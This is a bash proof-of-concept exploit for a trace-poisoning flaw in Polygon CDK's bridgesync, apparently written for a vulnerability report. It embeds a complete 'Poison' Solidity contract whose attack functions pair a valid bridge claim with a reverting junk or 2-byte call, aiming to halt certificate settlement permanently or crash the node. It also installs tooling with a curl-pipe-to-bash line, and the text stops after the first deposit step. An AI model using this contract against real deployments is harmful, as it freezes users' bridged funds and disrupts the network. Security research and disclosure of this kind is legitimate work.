#!/usr/bin/env bash
# ============================================================================
#  poc.sh — ONE-SHOT PoC: Claim-Calldata Trace Poisoning (0xPolygon/cdk)
#
#  Vulnerability (bridgesync/downloader.go):
#    (1) methodID := input[:4]   — no length check          (Variant A crash)
#    (2) DFS over callTracer frames, the "error" field is   (root cause)
#        never checked -> reverted calls are parsed
#    (3) LIFO stack, match by globalIndex only -> a reverted
#        second claimAsset call overwrites the valid claim  (root cause)
#
#  Impact (aggsender/aggsender.go): certificate build fails forever
#    => PERMANENT settlement halt => all post-attack L2->L1 exits frozen.
#
#  This single script does everything:
#    [env]  deps + writes foundry.toml/Poison.sol/Dockerfile.poc/config
#    [net]  starts the cdk devnet (docker compose, no kurtosis)
#           + our cdk-node container (SyncFullClaims = true)
#    [P0]   freshness gates
#    [P1]   BEFORE  — 100% NORMAL FLOW: real L1 deposit -> GER propagated
#           by AggOracle -> real valid claim -> healthy certificate build
#    [P2]   EXPLOIT — ONE tx: valid claim + reverted poisoned call (LIFO)
#    [P3]   AFTER   — poisoned row in bridgesync SQLite + error loop
#    [P4]   IMPACT  — settlement halt, observed N minutes (certs frozen)
#    [P5]   IMPACT  — victim withdrawal: funds leave L2, frozen in escrow
#    [P6]   IMPACT  — poisoning survives node restart (persistent)
#    [P7]   (--crash) Variant A: input[:4] panic -> crash-restart loop
#    [end]  BEFORE/AFTER summary + evidence bundle + exit code
#
#  Usage:
#     ./poc.sh                # quick validation (watch 2 min)
#     ./poc.sh 20             # final run for the report (watch 20 min)
#     ./poc.sh 20 --crash     # + Variant A
#
#  Requires: docker, curl, git. jq/sqlite3/foundry auto-installed.
#  Place in <cdk-repo>/poc/ and run from there.
# ============================================================================
set -o pipefail

# ------------------------------ configuration -------------------------------
POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CDK_DIR="${CDK_DIR:-$(dirname "$POC_DIR")}"
TEST_DIR="$CDK_DIR/test"

L1_RPC="${L1_RPC:-http://localhost:8545}"
L2_RPC="${L2_RPC:-http://localhost:8547}"
NODE="cdk-node"                                   # our container
DB_PATH="/app/data/bridgesync-l2.db"              # BridgeL2Sync.DBPath
CERTS="/app/data/certs"                           # SaveCertificatesToFilesPath

BRIDGE_L1="0x70e0ba845a1a0f2da3359c97e0285013525ffc49"
BRIDGE_L2="0x4ed7c70f96b99c776995fb64377f0d4ab3b0e1c1"
GER_L1="0x95401dc811bb5740090279ba06cfa8fcf6113778"

ATTACKER="0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"        # devnet-funded
PK_ATK="0xac0974bec39a17e36ba4a6ff4d22b03c699b947e62f77d99e7361e6315bd32d8"

AMOUNT=1000000000000000                            # 0.001 ETH
ZERO_ADDR="0x0000000000000000000000000000000000000000"
CLAIM_TOPIC="0x1df3f2a973a00d6635911755c260704e95e8a5876997546798770f76396fda4d"
ERR_SUB="error getting info by global exit root"  # aggsender error loop

JUNK_MER="0x$(printf '%056d' 0)deadbe01"           # must match Poison.sol
JUNK_RER="0x$(printf '%056d' 0)deadbe02"

EV="$POC_DIR/evidence"; mkdir -p "$EV" "$POC_DIR/src"
WATCH_MIN=2; RUN_CRASH=0
for a in "$@"; do case "$a" in
  [0-9]*) WATCH_MIN="$a" ;;
  --crash) RUN_CRASH=1 ;;
esac; done

# ------------------------------ tiny helpers --------------------------------
log(){ printf '\n\033[1;36m== %s ==\033[0m\n' "$*"; }
die(){ printf '\033[1;31mFATAL: %s\033[0m\n' "$*" >&2
      printf '\033[1;31m(evidence: %s)\033[0m\n' "$EV" >&2; exit 1; }

RESULTS=()
record(){ RESULTS+=("$1|$2"); printf '  [%s] %s\n' "$1" "$2"; }
check(){ local n="$1"; shift; if "$@"; then record PASS "$n"; else record FAIL "$n"; fi; }
check_warn(){ local n="$1"; shift; if "$@"; then record PASS "$n"; else record WARN "$n"; fi; }
poll_check(){ # name timeout cmd...
  local n="$1" t="$2"; shift 2; local end=$((SECONDS+t))
  while (( SECONDS < end )); do
    if "$@"; then record PASS "$n"; return 0; fi
    sleep 5
  done
  record FAIL "$n"; return 1
}

# cast wrappers ---------------------------------------------------------------
q_hash(){ cast call "$1" "$2" --rpc-url "$3" 2>/dev/null \
          | grep -oE '0x[0-9a-fA-F]{64}' | head -n1; }
q_uint(){ local o h; o=$(cast call "$1" "$2" --rpc-url "$3" 2>/dev/null) || return 1
  h=$(printf '%s' "$o" | grep -oE '0x[0-9a-fA-F]+' | head -n1)
  if [ -n "$h" ]; then printf '%d\n' "$((h))"; else printf '%d\n' "$((o))"; fi; }
kk(){ cast keccak "0x$1"; }
kk2(){ cast keccak "0x${1#0x}${2#0x}"; }   # keccak(a || b)

receipt_status(){ jq -r '.status // empty' "$EV/receipt_$1.json"; }
receipt_logs(){ jq -r '(.logs // []) | length' "$EV/receipt_$1.json"; }
receipt_topic0(){ jq -r '(.logs // [])[0].topics[0] // empty' "$EV/receipt_$1.json"; }
ok_tx(){ local s; s=$(receipt_status "$1"); [[ "$s" == "1" || "$s" == "0x1" ]]; }
claim_receipt_ok(){ ok_tx "$1" && [ "$(receipt_logs "$1")" = 1 ] \
                    && [ "$(receipt_topic0 "$1")" = "$CLAIM_TOPIC" ]; }

send_bridge(){ # rpc pk destnet destaddr amount meta tag to  (ETH via --value)
  local rpc="$1" pk="$2" dn="$3" da="$4" amt="$5" meta="$6" tag="$7" to="$8"
  if cast send "$to" "bridgeAsset(uint32,address,uint256,address,bool,bytes)" \
      "$dn" "$da" "$amt" "$ZERO_ADDR" false "$meta" \
      --rpc-url "$rpc" --private-key "$pk" --value "$amt" --json \
      >"$EV/receipt_$tag.json" 2>"$EV/receipt_$tag.err"; then return 0; fi
  cast send "$to" "bridgeAsset(uint32,address,uint256,address,bytes)" \
      "$dn" "$da" "$amt" "$ZERO_ADDR" "$meta" \
      --rpc-url "$rpc" --private-key "$pk" --value "$amt" --json \
      >"$EV/receipt_$tag.json" 2>"$EV/receipt_$tag.err"
}

# ------------------------------ log / node ----------------------------------
node_up(){ docker ps --filter "name=$NODE" --format '{{.Status}}' | grep -q '^Up'; }
err_count(){ local n; n=$(grep -c "$ERR_SUB" "$EV/node.log" 2>/dev/null); printf '%s' "${n:-0}"; }
err_at_least(){ [ "$(err_count)" -ge "$1" ]; }
err_gt(){ [ "$(err_count)" -gt "$1" ]; }
grep_log(){ grep -q "$1" "$EV/node.log"; }
grep_numclaims(){ grep -q "numClaims: $1" "$EV/node.log"; }
cert_count(){ local n; n=$(docker exec "$NODE" sh -c \
  "ls $CERTS 2>/dev/null | grep -c certificate_"); printf '%s' "${n:-0}"; }
restart_count(){ docker inspect -f '{{.RestartCount}}' "$NODE" 2>/dev/null \
                 | grep -oE '[0-9]+' || printf 0; }

# ------------------------------ bridgesync DB -------------------------------
db_query(){ # sql  (docker cp + sqlite3, retries on lock)
  local db="$EV/tmp.db" i
  for i in 1 2 3; do
    rm -f "$EV/tmp.db"*; docker cp "$NODE:$DB_PATH" "$db" >/dev/null 2>&1 || { sleep 3; continue; }
    docker cp "$NODE:$DB_PATH-wal" "$db-wal" >/dev/null 2>&1 || true
    docker cp "$NODE:$DB_PATH-shm" "$db-shm" >/dev/null 2>&1 || true
    local r; r=$(sqlite3 "$db" "$1" 2>/dev/null) && { printf '%s' "$r"; return 0; }
    sleep 3
  done
  return 1
}
db_dump(){ # tag  (evidence snapshot)
  local db="$EV/$1_bridgesync.db"; rm -f "$EV/$1_bridgesync.db"*
  for s in "" "-wal" "-shm"; do
    docker cp "$NODE:$DB_PATH$s" "$db$s" >/dev/null 2>&1 || true; done
  sqlite3 "$db" "SELECT block_num, global_index, mainnet_exit_root,
    rollup_exit_root, global_exit_root, destination_network, metadata
    FROM claim ORDER BY block_num;" > "$EV/claims_$1.csv" 2>/dev/null || true
}
GER_CLEAN(){ printf '%s' "${1#0x}" | tr 'A-F' 'a-f'; }
db_row_ger(){ # gi_dec expected_ger -> 0 if the row's GER matches
  local row; row=$(db_query "SELECT CASE typeof(global_exit_root)
    WHEN 'blob' THEN hex(global_exit_root) ELSE lower(global_exit_root) END
    FROM claim WHERE global_index='$1' OR global_index=$1;") || return 1
  [ -n "$row" ] && printf '%s' "$row" | tr -d 'x' | tr 'A-F' 'a-f' \
    | grep -q "$(GER_CLEAN "$2")"
}
db_row_junk(){ # gi_dec -> row carries JUNK MER/RER (overwrite proof)
  local row; row=$(db_query "SELECT CASE typeof(mainnet_exit_root)
    WHEN 'blob' THEN hex(mainnet_exit_root) ELSE lower(mainnet_exit_root) END,
    CASE typeof(rollup_exit_root) WHEN 'blob' THEN hex(rollup_exit_root)
    ELSE lower(rollup_exit_root) END FROM claim
    WHERE global_index='$1' OR global_index=$1;") || return 1
  printf '%s' "$row" | grep -qi deadbe01 && printf '%s' "$row" | grep -qi deadbe02
}
db_bridge_count(){ db_query "SELECT COUNT(*) FROM bridge;"; }

# ------------------------------ exit-tree math ------------------------------
mk_ladder(){ local z="$1"; Z_LAD=("$z"); local i
  for i in $(seq 1 31); do Z_LAD[i]=$(kk2 "${Z_LAD[$((i-1))]}" "${Z_LAD[$((i-1))]}"); done; }
Z_FLAT=(); Z_HASHED=()
init_ladders(){ local z0="0x$(printf '%064d' 0)"
  Z_FLAT=(); mk_ladder "$z0"; Z_FLAT=("${Z_LAD[@]}")
  mk_ladder "$(kk2 "$z0" "$z0")"; Z_HASHED=("${Z_LAD[@]}"); }
use_ladder(){ if [ "$1" = FLAT ]; then Z_LAD=("${Z_FLAT[@]}"); else Z_LAD=("${Z_HASHED[@]}"); fi; }
root_single(){ local n="$1" i; for i in $(seq 0 31); do n=$(kk2 "$n" "${Z_LAD[$i]}"); done; printf '%s' "$n"; }
root_pair(){ local n; n=$(kk2 "$1" "$2"); local i
  for i in $(seq 1 31); do n=$(kk2 "$n" "${Z_LAD[$i]}"); done; printf '%s' "$n"; }
root_triple(){ local n; n=$(kk2 "$(kk2 "$1" "$2")" "$(kk2 "$3" "${Z_LAD[0]}")"); local i
  for i in $(seq 2 31); do n=$(kk2 "$n" "${Z_LAD[$i]}"); done; printf '%s' "$n"; }
blob(){ local out="0x" h; for h in "$@"; do out+="${h#0x}"; done; printf '%s' "$out"; }

# BridgeEvent topic0 (same string as bridgesync/downloader.go)
BRIDGE_TOPIC=$(cast sig-event "BridgeEvent(uint8,uint32,address,uint32,address,uint256,bytes,uint32)") \
  || die "cast sig-event failed"

decode_deposit(){ # tag -> exports DEP_* from the receipt's BridgeEvent
  local h; h=$(jq -r --arg t "$BRIDGE_TOPIC" \
    '([.logs[]? | select((.topics[0] // "") == $t)][0].data // empty)' \
    "$EV/receipt_$1.json" | sed 's/^0x//')
  [ -n "$h" ] || return 1
  DEP_LT="${h:62:2}"                                   # leafType  (uint8)
  DEP_ON=$((16#${h:120:8}))                            # originNetwork
  DEP_OTOK="0x${h:152:40}"                             # originToken
  DEP_DN=$((16#${h:248:8}))                            # destinationNetwork
  DEP_DA="0x${h:280:40}"                               # destinationAddress
  DEP_AMT=$(cast to-dec "0x${h:320:64}" 2>/dev/null)   # amount
  local off len; off=$((16#${h:384:64}))
  len=$(cast to-dec "0x${h:$((off*2)):64}" 2>/dev/null)
  DEP_META="0x${h:$((off*2+64)):$((len*2))}"           # metadata
  DEP_IDX=$((16#${h:504:8}))                           # depositCount
  DEP_LEAF=$(kk "00$(printf '%08x' $DEP_ON)${DEP_OTOK#0x}$(printf '%08x' $DEP_DN)${DEP_DA#0x}$(printf '%064x' $DEP_AMT)$(cast keccak "$DEP_META" | sed 's/^0x//')")
  return 0
}

calibrate(){ # onchain_mer (after deposit #1) -> picks the SMT zero convention
  local mer="$1"
  local lad
  for lad in FLAT HASHED; do
    use_ladder "$lad"
    if [ "$(root_single "$DEP_LEAF")" = "$mer" ]; then CAL_LAD="$lad"; return 0; fi
  done
  return 1
}

gi_hex(){ printf '0x01%08x%08x' 0 "$1"; }                    # mainnet-flag GI
gi_dec(){ cast to-dec "$(gi_hex "$1")" 2>/dev/null \
          || printf '1844674407370955%s' "$(printf '%04d' $((16+$1)))"; }
gi64(){ printf '%046d01%08x%08x' 0 0 "$1"; }                 # 64-hex, padded

# ------------------------------ project files -------------------------------
cat > "$POC_DIR/foundry.toml" <<'TOML'
[profile.default]
src = "src"
out = "out"
solc = "0.8.20"
via_ir = true
optimizer = true
optimizer_runs = 200
TOML

cat > "$POC_DIR/src/Poison.sol" <<'SOL'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBridge {
    function claimAsset(
        bytes32[32] calldata smtProofLocalExitRoot,
        bytes32[32] calldata smtProofRollupExitRoot,
        uint256 globalIndex,
        bytes32 mainnetExitRoot,
        bytes32 rollupExitRoot,
        uint32 originNetwork,
        address originTokenAddress,
        uint32 destinationNetwork,
        address destinationAddress,
        uint256 amount,
        bytes calldata metadata
    ) external;
}

contract Poison {
    IBridge public immutable bridge;

    // Poisoned MER/RER => bridgesync stores GER = keccak(JUNK_MER, JUNK_RER),
    // which will NEVER exist in the L1 info tree => aggsender fails forever.
    bytes32 private constant JUNK_MER = bytes32(uint256(0xdeadbe01));
    bytes32 private constant JUNK_RER = bytes32(uint256(0xdeadbe02));

    constructor(IBridge _bridge) { bridge = _bridge; }

    function _split(bytes calldata b) internal pure returns (bytes32[32] memory r) {
        require(b.length == 1024, "blob must be 1024 bytes");
        for (uint256 i = 0; i < 32; ++i) r[i] = bytes32(b[i * 32:(i + 1) * 32]);
    }

    /// CONTROL (before): a plain, fully valid claim routed through this
    /// contract, so the ONLY difference vs the attack is the junk call.
    function claimOnly(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);
    }

    /// ATTACK (Variant B): valid claim FIRST (the only ClaimEvent), poisoned
    /// call LAST. bridgesync's LIFO stack pops the poisoned frame first, it
    /// matches on globalIndex, overwrites the claim's MER/RER/proofs, and
    /// returns — the valid frame is never processed. The poisoned call
    /// reverts on-chain (unknown GER), but callTracer still records its
    /// input and bridgesync never checks the frame's "error" field.
    function attackWorstCase(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bytes32[32] memory zero;

        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);

        (bool ok, ) = address(bridge).call(abi.encodeCall(
            IBridge.claimAsset,
            (zero, zero, globalIndex, JUNK_MER, JUNK_RER,
             originNetwork, originToken, destinationNetwork, destinationAddress,
             amount, metadata)
        ));
        ok; // intentionally ignored — the revert is expected
    }

    /// ATTACK (Variant A): second call with a 2-byte input. bridgesync does
    /// input[:4] with no length check => runtime panic => crash loop.
    function attackCrash(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);
        (bool ok, ) = address(bridge).call(hex"1234"); // 2 bytes < 4 => panic
        ok;
    }
}
SOL

cat > "$POC_DIR/Dockerfile.poc" <<'DOCKERFILE'
FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*
COPY target/cdk-node /usr/local/bin/cdk-node
DOCKERFILE

cat > "$POC_DIR/poc.config.toml" <<'CONFIGEOF'
[Common]
IsValidiumMode = false
ContractVersions = "banana"

[L1Config]
chainId = 1337
polTokenAddress = "0x0000000000000000000000000000000000000000"
polygonZkEVMAddress = "0x70e0ba845a1a0f2da3359c97e0285013525ffc49"
polygonRollupManagerAddress = "0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9"
polygonZkEVMGlobalExitRootAddress = "0x95401dc811bb5740090279ba06cfa8fcf6113778"

[AggSender]
StoragePath = "/app/data/aggsender.db"
AggLayerURL = "http://agglayer:9090"
AggsenderPrivateKey = {Path = "/app/keystore/aggsender.keystore", Password = "testonly"}
URLRPCL2 = "http://l2:8545"
BlockFinality = "LatestBlock"
EpochNotificationPercentage = 0
SaveCertificatesToFilesPath = "/app/data/certs"
MaxRetriesStoreCertificate = 5
DelayBeetweenRetries = "5s"
KeepCertificatesHistory = false
MaxCertSize = 0
BridgeMetadataAsHash = false
DryRun = false
EnableRPC = true

[BridgeL2Sync]
DBPath = "/app/data/bridgesync-l2.db"
BlockFinality = "LatestBlock"
InitialBlockNum = 0
BridgeAddr = "0x4ed7c70f96b99c776995fb64377f0d4ab3b0e1c1"
SyncBlockChunkSize = 100
RetryAfterErrorPeriod = "5s"
MaxRetryAttemptsAfterError = 5
WaitForNewBlocksPeriod = "1s"
OriginNetwork = 0
SyncFullClaims = true

[BridgeL1Sync]
DBPath = "/app/data/bridgesync-l1.db"
BlockFinality = "LatestBlock"
InitialBlockNum = 0
BridgeAddr = "0x70e0ba845a1a0f2da3359c97e0285013525ffc49"
SyncBlockChunkSize = 100
RetryAfterErrorPeriod = "5s"
MaxRetryAttemptsAfterError = 5
WaitForNewBlocksPeriod = "1s"
OriginNetwork = 1
SyncFullClaims = false

[L1InfoTreeSync]
DBPath = "/app/data/l1infotreesync.db"
GlobalExitRootAddr = "0x95401dc811bb5740090279ba06cfa8fcf6113778"
RollupManagerAddr = "0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9"
SyncBlockChunkSize = 100
BlockFinality = "LatestBlock"
URLRPCL1 = "http://l1:8545"
WaitForNewBlocksPeriod = "1s"
InitialBlock = 0
RetryAfterErrorPeriod = "5s"
MaxRetryAttemptsAfterError = 5

[ReorgDetectorL1]
DBPath = "/app/data/reorgdetector-l1.db"
URLRPCL1 = "http://l1:8545"
BlockFinality = "LatestBlock"
WaitPeriodBlocks = "1s"

[ReorgDetectorL2]
DBPath = "/app/data/reorgdetector-l2.db"
URLRPCL2 = "http://l2:8545"
BlockFinality = "LatestBlock"
WaitPeriodBlocks = "1s"

[Aggregator]
ChainID = 2741
Host = "0.0.0.0"
Port = 50081
RetryTime = "5s"
VerifyProofInterval = "10s"
TxProfitabilityCheckerType = "acceptall"
SenderAddress = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
AggLayerTxTimeout = "5m"
AggLayerURL = "http://agglayer:9090"
RPCURL = "http://l2:8545"
WitnessURL = "http://l2:8545"
SettlementBackend = "l1"

[Etherman]
URL = "http://l1:8545"
L1ChainID = 1337

[Log]
Environment = "development"
Level = "info"
Outputs = ["stderr"]

[AggOracle]
BlockFinality = "LatestBlock"
TargetChainType = "EVM"
WaitPeriodNextGER = "10s"

[AggOracle.EVMSender]
GlobalExitRootL2Addr = "0xc6e7df5e7b4f2a278906862b61205850344d4e7d"
SenderAddr = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
GasOffset = 0
WaitPeriodMonitorTx = "5s"

[AggOracle.EVMSender.EthTxManager]
FrequencyToMonitorTxs = "1s"
WaitTxToBeMined = "2m"
GetReceiptMaxTime = "250ms"
GetReceiptWaitInterval = "1s"
PrivateKeys = [{Path = "/app/keystore/aggoracle.keystore", Password = "testonly"}]
ForcedGas = 0
GasPriceMarginFactor = 1
MaxGasPriceLimit = 0
StoragePath = "/app/data/ethtxmanager.db"
ReadPendingL1Txs = false
SafeStatusL1NumberOfBlocks = 0
FinalizedStatusL1NumberOfBlocks = 0

[AggOracle.EVMSender.EthTxManager.Etherman]
URL = "http://l2:8545"
MultiGasProvider = false
L1ChainID = 2741
HTTPHeaders = []
CONFIGEOF

# ------------------------------ environment ---------------------------------
log "ENV — dependencies"
command -v docker >/dev/null || die "docker missing"
command -v curl    >/dev/null || die "curl missing"
sudo -n true 2>/dev/null || die "passwordless sudo required (Codespaces default)"
for pkg in jq sqlite3; do
  command -v "$pkg" >/dev/null || sudo apt-get install -y -qq "$pkg" >/dev/null 2>&1 \
    || die "cannot install $pkg"
done
command -v cast >/dev/null 2>&1 || {
  curl -L https://foundry.paradigm.xyz | bash >/dev/null
  export PATH="$HOME/.foundry/bin:$PATH"; foundryup >/dev/null
  command -v cast >/dev/null || die "cast missing — open a new shell and rerun"
}
command -v forge >/dev/null 2>&1 || export PATH="$HOME/.foundry/bin:$PATH"

grep -q 'input\[:4\]' "$CDK_DIR/bridgesync/downloader.go" 2>/dev/null \
  || die "vulnerable code not in $CDK_DIR/bridgesync/downloader.go — checkout the same tag as the original PoC"

# ------------------------------ Go binary + image ---------------------------
if [ ! -f "$CDK_DIR/target/cdk-node" ]; then
  log "ENV — building cdk-node (Go) inside a golang container (one time, 3-8 min)"
  MAIN=""
  for d in cmd/cdk cmd/cdk-node; do [ -d "$CDK_DIR/$d" ] && MAIN="./$d" && break; done
  [ -n "$MAIN" ] || die "Go main package not found — ls $CDK_DIR/cmd and edit MAIN"
  built=0
  for gv in 1.22 1.23 1.21; do
    docker run --rm -v "$CDK_DIR":/src -v cdk-gomodcache:/go/pkg/mod -w /src \
      "golang:$gv" go build -o target/cdk-node "$MAIN" && built=1 && break
    echo "  golang:$gv failed, trying next..."
  done
  [ "$built" = 1 ] || die "go build failed"
fi
if ! docker image inspect cdk-poc >/dev/null 2>&1; then
  log "ENV — building image cdk-poc"
  BCTX="$POC_DIR/.buildctx"; rm -rf "$BCTX"; mkdir -p "$BCTX/target"
  cp "$CDK_DIR/target/cdk-node" "$BCTX/target/"
  docker build -q -t cdk-poc -f "$POC_DIR/Dockerfile.poc" "$BCTX" >/dev/null \
    || die "cdk-poc image build failed"
fi

# ------------------------------ devnet --------------------------------------
log "NET — fresh devnet (docker compose, no kurtosis)"
[ -d "$TEST_DIR" ] || die "$TEST_DIR not found"
DEVNET_TARGET="${DEVNET_TARGET:-}"
if [ -z "$DEVNET_TARGET" ]; then
  for t in start run up all; do
    (cd "$TEST_DIR" && make -n "$t" >/dev/null 2>&1) && DEVNET_TARGET="$t" && break
  done
fi
[ -n "$DEVNET_TARGET" ] || die "make target not detected — cd $TEST_DIR && make help, then: DEVNET_TARGET=<name> ./poc.sh"
echo "  devnet target: make $DEVNET_TARGET"
( cd "$TEST_DIR" && (make down >/dev/null 2>&1 || docker compose down -v >/dev/null 2>&1 || true) ) || true
docker rm -f "$NODE" >/dev/null 2>&1 || true
docker volume rm cdk-node-data >/dev/null 2>&1 || true
( cd "$TEST_DIR" && make "$DEVNET_TARGET" ) >"$EV/devnet_make.log" 2>&1 &
echo "  waiting for L1/L2 RPC..."
rpc_ok=0
for i in $(seq 1 90); do
  if cast block-number --rpc-url "$L1_RPC" >/dev/null 2>&1 \
     && cast block-number --rpc-url "$L2_RPC" >/dev/null 2>&1; then rpc_ok=1; break; fi
  sleep 10
done
[ "$rpc_ok" = 1 ] || die "RPC not up — check $EV/devnet_make.log and 'docker ps' (ports); adjust L1_RPC/L2_RPC"

# devnet artifacts: genesis + keystores
GENESIS="$(ls "$TEST_DIR"/config/*genesis*.json 2>/dev/null | head -n1)"
[ -z "$GENESIS" ] && GENESIS="$(find "$CDK_DIR" -name '*genesis*.json' 2>/dev/null | head -n1)"
KS_A="$(find "$CDK_DIR" -name 'aggsender.keystore' 2>/dev/null | head -n1)"
KS_O="$(find "$CDK_DIR" -name 'aggoracle.keystore' 2>/dev/null | head -n1)"
if [ -z "$KS_A" ]; then  # fallback: create keystores with cast (devnet key = anvil #0)
  cast wallet import aggsender --private-key "$PK_ATK" --unsafe-password testonly >/dev/null 2>&1 || true
  KS_A="$(find "$HOME/.foundry" -path '*aggsender*' -name 'UTC*' 2>/dev/null | head -n1)"
fi
if [ -z "$KS_O" ]; then
  cast wallet import aggoracle --private-key "$PK_ATK" --unsafe-password testonly >/dev/null 2>&1 || true
  KS_O="$(find "$HOME/.foundry" -path '*aggoracle*' -name 'UTC*' 2>/dev/null | head -n1)"
fi
[ -f "$GENESIS" ] || die "genesis json not found under $CDK_DIR"
[ -f "$KS_A" ]    || die "aggsender.keystore not found"
[ -f "$KS_O" ]    || die "aggoracle.keystore not found"

NET=""
for c in l2 cdk-erigon l2-sequencer zkevm-prover agglayer l1; do
  n="$(docker inspect "$c" --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}' 2>/dev/null | head -n1)"
  [ -n "$n" ] && NET="$n" && break
done
[ -z "$NET" ] && NET="$(docker network ls --filter name=cdk --format '{{.Name}}' | head -n1)"
[ -n "$NET" ] || die "devnet docker network not found"

log "NET — starting our cdk-node container (all Go components, SyncFullClaims=true)"
docker rm -f "$NODE" >/dev/null 2>&1 || true
docker run -d --name "$NODE" --network "$NET" --restart unless-stopped \
  -e CDK_AGGREGATOR_DB_HOST=cdk-aggregator-db \
  -e CDK_AGGREGATOR_SENDER_ADDRESS=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 \
  -v "$POC_DIR/poc.config.toml":/app/config.toml:ro \
  -v "$GENESIS":/app/genesis.json:ro \
  -v "$KS_A":/app/keystore/aggsender.keystore:ro \
  -v "$KS_O":/app/keystore/aggoracle.keystore:ro \
  -v cdk-node-data:/app/data \
  cdk-poc \
  cdk-node run --cfg /app/config.toml --network custom --custom-network-file /app/genesis.json \
  || die "cdk-node failed to start — docker logs $NODE"

: > "$EV/node.log"
docker logs -f --timestamps "$NODE" >"$EV/node.log" 2>&1 & LOGPID=$!
trap 'kill $LOGPID 2>/dev/null' EXIT

poll_check "aggsender is alive (certificate loop visible)" 600 \
  sh -c "grep -qE 'building certificate|no bridges consumed|AggSender started' '$EV/node.log'" \
  || { docker logs "$NODE" 2>&1 | tail -40; die "aggsender not active"; }

log "ENV — forge build Poison.sol"
( cd "$POC_DIR" && forge build ) >/dev/null 2>&1 || die "forge build failed"
INIT=$(jq -r 'if (.bytecode|type)=="object" then .bytecode.object else .bytecode end' \
  "$POC_DIR/out/Poison.sol/Poison.json")
[ -n "$INIT" ] && [ "$INIT" != "null" ] || die "bytecode extraction failed"

{ echo "cdk commit : $(git -C "$CDK_DIR" rev-parse HEAD)"
  echo "branch     : $(git -C "$CDK_DIR" branch --show-current)"
  echo "cast       : $(cast --version)"
  echo "started    : $(date -u)" ; } > "$EV/environment.txt"

init_ladders
JUNK_GER=$(kk2 "$JUNK_MER" "$JUNK_RER")
CLAIM_SIG="claimOnly(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
ATTACK_SIG="attackWorstCase(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
CRASH_SIG="attackCrash(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"

POISON=""
deploy_poison(){
  cast send --create "$INIT" "$BRIDGE_L2" --rpc-url "$L2_RPC" \
    --private-key "$PK_ATK" --json >"$EV/receipt_deploy.json" 2>"$EV/receipt_deploy.err" \
    || die "Poison deploy failed"
  POISON=$(jq -r '.contractAddress // empty' "$EV/receipt_deploy.json")
  [ -n "$POISON" ] || die "no contractAddress in deploy receipt"
  echo "  Poison deployed at $POISON"
}
sim_claim(){ # sig blob gi_hex mer rer meta
  cast call "$POISON" "$1" "$2" "$3" "$4" "$5" "$DEP_ON" "$DEP_OTOK" \
    "$DEP_DN" "$DEP_DA" "$DEP_AMT" "$6" --rpc-url "$L2_RPC" >/dev/null 2>&1
}
send_claim(){ # sig tag blob gi_hex mer rer meta
  cast send "$POISON" "$1" "$3" "$4" "$5" "$6" "$DEP_ON" "$DEP_OTOK" \
    "$DEP_DN" "$DEP_DA" "$DEP_AMT" "$7" \
    --rpc-url "$L2_RPC" --private-key "$PK_ATK" --json \
    >"$EV/receipt_$2.json" 2>"$EV/receipt_$2.err"
}
tr_count(){ # mode [gi64]  — count bridge call frames in a trace
  local mode="$1" g="${2:-}"
  local f='[..|objects|select(((.to//"")|ascii_downcase)==$b)|select(((.input//"0x")|ascii_downcase|startswith("0xccaa2d11"))'
  case "$mode" in
    valid) f+='|select(.error==null)]' ;;
    junk)  f+="|select(has(\"error\"))|select(((.input|ascii_downcase)[4106:4170])==\$g)]" ;;
    *)     f+=']' ;;
  esac
  jq -n --arg b "$BRIDGE_L2" --arg g "$g" "$f|length" 2>/dev/null
}
fetch_trace(){ cast rpc debug_traceTransaction "$1" '{"tracer":"callTracer"}' \
  --rpc-url "$L2_RPC" >"$EV/$2" 2>/dev/null; }

# ============================================================================
log "P0: PREREQUISITES & FRESHNESS GATE"
check "cdk-node container is up" node_up
check "L1 and L2 RPC responsive" sh -c "cast block-number --rpc-url $L1_RPC >/dev/null && cast block-number --rpc-url $L2_RPC >/dev/null"
check "fresh devnet: L1 mainnet exit tree empty (depositCount == 0)" \
  test "$(q_uint "$BRIDGE_L1" 'depositCount()(uint32)' "$L1_RPC")" = 0
check "fresh devnet: zero certificate errors" test "$(err_count)" = 0

# ============================================================================
log "P1: BEFORE — NORMAL FLOW (deposit -> GER -> valid claim -> healthy settlement)"
send_bridge "$L1_RPC" "$PK_ATK" 0 "$ATTACKER" "$AMOUNT" "0x01" deposit1 "$BRIDGE_L1" \
  || die "deposit #1 failed — see $EV/receipt_deposit1.err"
ok_tx deposit1 || die "deposit #1 status != 1"
